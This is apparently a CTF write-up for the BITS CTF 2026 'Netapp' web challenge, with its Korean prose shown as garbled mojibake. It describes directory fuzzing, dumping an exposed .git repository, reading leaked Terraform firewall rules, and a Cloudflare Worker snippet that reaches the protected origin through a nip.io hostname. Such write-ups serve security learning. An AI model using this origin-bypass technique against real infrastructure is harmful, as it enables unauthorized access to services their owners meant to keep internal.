---
title: "[Web] Netapp"
description: Writing about the "Netapp" of BITS CTF 2026.
date: 2026-02-22 01:00:00 +0900
categories: [CTF, BITS CTF 2026]
tags: [Web]
toc: true
comments: false
---

# Netapp (BITS CTF 2026)
---
- Name : Netapp
- Category : Web
- Description : We think our internal services are protected because we use netapp ğŸ˜˜
- Difficulty : â˜…â˜…â˜†â˜†â˜†
---

## TL;DR

ë…¸ì¶œëœ `.git` ì €ì¥ì†Œì—ì„œ Terraform ì½”ë“œë¥¼ í†µí•´ EC2 IP íšë“.   
Cloudflare Workerì—ì„œ `nip.io` wildcard DNSë¡œ IPë¥¼ ë„ë©”ì¸ì²˜ëŸ¼ ìœ„ì¥í•´ EC2ì— ì§ì ‘ ì ‘ê·¼, í”Œë˜ê·¸ íšë“.  

---

## Overview

**ë¬¸ì œ ì„¤ëª…:** "We think our internal services are protected because we use netapp ğŸ˜œ"

`https://netapp.bitskrieg.in` ì ‘ì† ì‹œ ì•„ë˜ ì„œë¹„ìŠ¤ í˜„í™©ì´ í‘œì‹œëœë‹¤.

| ì„œë¹„ìŠ¤ | ìƒíƒœ |
|--------|------|
| Web Portal | ğŸŸ¢ ONLINE |
| Auth Gateway | ğŸŸ¢ ONLINE |
| flag-service | ğŸŸ¡ INTERNAL (VPN ì „ìš©) |

**ëª©í‘œ:** VPN ì—†ì´ `flag-service`ì— ì ‘ê·¼í•˜ê¸°.

---

## Solution

### 1) Recon â€” `.git` ë””ë ‰í† ë¦¬ ë…¸ì¶œ

`ffuf`ë¡œ ë””ë ‰í† ë¦¬ ë¸Œë£¨íŠ¸í¬ì‹± ì¤‘ `.git` ë””ë ‰í† ë¦¬ ë°œê²¬.

```bash
ffuf -u https://netapp.bitskrieg.in/FUZZ -w wordlist.txt -mc 200,301,302
# [200] /.git/config
# [200] /.git/HEAD
```

`git-dumper`ë¡œ ì „ì²´ ì €ì¥ì†Œ ë¤í”„:

```bash
git-dumper https://netapp.bitskrieg.in /tmp/netapp-git
```

ë¤í”„ëœ íŒŒì¼ êµ¬ì¡°:
```
index.html
flag-service/
  â”œâ”€â”€ aws-security-group.tf    â† EC2 IP ë…¸ì¶œ
  â””â”€â”€ bitsctf-2026-vpn-only.tf â† Cloudflare ë°©í™”ë²½ ê·œì¹™ ë…¸ì¶œ
```

---

### 2) Root Cause â€” Terraform ì½”ë“œ ë¶„ì„

**`aws-security-group.tf`** â€” EC2 IPì™€ ë³´ì•ˆê·¸ë£¹ ì„¤ì • ë…¸ì¶œ:

```hcl
# EC2 instance IP - 3.208.18.209  â† í•µì‹¬ ì •ë³´

resource "aws_security_group" "cf_only_web" {
  # HTTP/HTTPSë¥¼ Cloudflare IP ëŒ€ì—­ì—ì„œë§Œ í—ˆìš©
  ingress {
    from_port   = 80
    cidr_blocks = ["173.245.48.0/20", "103.21.244.0/22", ...]  # Cloudflare IPë§Œ
  }
}
```

**`bitsctf-2026-vpn-only.tf`** â€” Cloudflare ë°©í™”ë²½ ê·œì¹™ ë…¸ì¶œ:

```hcl
resource "cloudflare_filter" "vpn_access_filter" {
  # bitsctf-2026.hvijay.devì— ì˜¤ëŠ” ëª¨ë“  ìš”ì²­ ì°¨ë‹¨
  body = "(http.host eq \"bitsctf-2026.hvijay.dev\") and (ip.src ne 0.0.0.0)"
}
resource "cloudflare_firewall_rule" "vpn_access_rule" {
  action = "block"
}
```

**ì¸í”„ë¼ êµ¬ì¡° ì •ë¦¬:**

```
ì™¸ë¶€ ìš”ì²­
    â”‚
    â–¼
Cloudflare ë°©í™”ë²½
  â†’ (http.host = bitsctf-2026.hvijay.dev) AND (ip.src â‰  0.0.0.0)
  â†’ ì¡°ê±´ ë§Œì¡± ì‹œ BLOCK  â† ì‚¬ì‹¤ìƒ ëª¨ë“  IPê°€ 0.0.0.0ì´ ì•„ë‹ˆë¯€ë¡œ ì „ë¶€ ì°¨ë‹¨
    â”‚
    â–¼
AWS EC2 (3.208.18.209)
  â†’ ë³´ì•ˆê·¸ë£¹: Cloudflare IP ëŒ€ì—­ë§Œ 80/443 í—ˆìš©
  â†’ ê·¸ ì™¸ IPëŠ” ì „ë¶€ DROP
```

**ì¦‰, ì´ì¤‘ ë³´í˜¸:**
1. Cloudflareê°€ ëª¨ë“  ì™¸ë¶€ ì ‘ê·¼ ì°¨ë‹¨
2. AWSê°€ Cloudflareê°€ ì•„ë‹Œ IPëŠ” ì°¨ë‹¨

---

### 3) ì‹œë„í•œ ìš°íšŒ ë°©ë²•ë“¤ (ì‹¤íŒ¨)

| ì‹œë„ | ê²°ê³¼ | ì´ìœ  |
|------|------|------|
| ì§ì ‘ ì ‘ê·¼ `https://bitsctf-2026.hvijay.dev` | 403 | Cloudflare ë°©í™”ë²½ |
| IPv6 ê°•ì œ ì ‘ì† `curl -6` | ì—°ê²° ë¶ˆê°€ | ë¡œì»¬ í™˜ê²½ IPv6 ë¯¸ì§€ì› |
| `X-Forwarded-For: 0.0.0.0` í—¤ë” | 403 | Cloudflareê°€ ë¬´ì‹œ |
| EC2 IP ì§ì ‘ ì ‘ê·¼ `http://3.208.18.209` | íƒ€ì„ì•„ì›ƒ | AWS ë³´ì•ˆê·¸ë£¹ ì°¨ë‹¨ |
| CF Access í—¤ë” ì¡°ì‘ | 403 | íš¨ê³¼ ì—†ìŒ |
| DNS ë¸Œë£¨íŠ¸í¬ì‹± / CT ë¡œê·¸ ë¶„ì„ | ì¶”ê°€ ë„ë©”ì¸ ë°œê²¬í–ˆìœ¼ë‚˜ í”Œë˜ê·¸ ì—†ìŒ | |
| Cloudflare Worker â†’ EC2 IP ì§ì ‘ fetch | Error 1003 | CFê°€ IP ì§ì ‘ ì ‘ê·¼ ì°¨ë‹¨ |
| Cloudflare Worker â†’ ë„ë©”ì¸ fetch | 403 | ë°©í™”ë²½ ì—¬ì „íˆ ì ìš© |

---

### 4) Exploit â€” nip.ioë¥¼ ì´ìš©í•œ ìš°íšŒ

**í•µì‹¬ ì•„ì´ë””ì–´:**

- Cloudflare Workerì—ì„œ ìš”ì²­ì„ ë³´ë‚´ë©´ â†’ AWS ë³´ì•ˆê·¸ë£¹ ì…ì¥ì—ì„œ Cloudflare IP â†’ **í†µê³¼**
- í•˜ì§€ë§Œ EC2 IP ì§ì ‘ fetch â†’ **Error 1003** (Cloudflareê°€ IP ì§ì ‘ ì ‘ê·¼ ì°¨ë‹¨)
- `nip.io`ëŠ” `3.208.18.209.nip.io`ë¥¼ `3.208.18.209`ìœ¼ë¡œ í•´ì„í•´ì£¼ëŠ” wildcard DNS
- ë„ë©”ì¸ í˜•íƒœì´ë¯€ë¡œ Error 1003 ë¯¸ì ìš©
- `nip.io` ë„ë©”ì¸ì´ë¯€ë¡œ `http.host eq "bitsctf-2026.hvijay.dev"` ì¡°ê±´ ë¶ˆì¼ì¹˜ â†’ ë°©í™”ë²½ ë¯¸ì ìš©

**Cloudflare Workers Playgroundì—ì„œ ì‹¤í–‰:**

```javascript
export default {
  async fetch(request) {
    const targetUrl = "http://3.208.18.209.nip.io/";
    const response = await fetch(targetUrl);
    return response;
  }
};
```

**ê²°ê³¼:**
```
HTTP 200 OK
BITSCTF{...}
```

---

### 5) Why It Works

```
[Cloudflare Workers Playground]
         â”‚
         â”‚ fetch("http://3.208.18.209.nip.io/")
         â–¼
[Cloudflare ë°©í™”ë²½]
  - http.host = "3.208.18.209.nip.io"
  - ë°©í™”ë²½ ì¡°ê±´: http.host eq "bitsctf-2026.hvijay.dev" â†’ FALSE
  - ë°©í™”ë²½ ê·œì¹™ ë¯¸ì ìš© â†’ í†µê³¼ âœ…
         â”‚
         â–¼
[AWS EC2: 3.208.18.209]
  - ìš”ì²­ ì¶œì²˜ = Cloudflare Worker IP ëŒ€ì—­
  - ë³´ì•ˆê·¸ë£¹: Cloudflare IP í—ˆìš© â†’ í†µê³¼ âœ…
  - í”Œë˜ê·¸ ë°˜í™˜
```

ë‘ ë³´í˜¸ë¥¼ ë™ì‹œì— ìš°íšŒí•œ ì´ìœ :
- **AWS ë³´ì•ˆê·¸ë£¹** â†’ Workerê°€ Cloudflare IPì´ë¯€ë¡œ í†µê³¼
- **Cloudflare ë°©í™”ë²½** â†’ `nip.io` ë„ë©”ì¸ì´ë¼ ë°©í™”ë²½ ì¡°ê±´ ìì²´ê°€ ë§¤ì¹­ ì•ˆ ë¨

---

## Solver

```javascript
// https://workers.cloudflare.com/playground ì—ì„œ ì‹¤í–‰
export default {
  async fetch(request) {
    const targetUrl = "http://3.208.18.209.nip.io/";
    const response = await fetch(targetUrl);
    return response;
  }
};
```
---
<img width="2368" height="804" alt="ìŠ¤í¬ë¦°ìƒ· 2026-02-21 221737" src="https://github.com/user-attachments/assets/f979a02e-e27b-437f-947c-bfa35057b42d" />
---

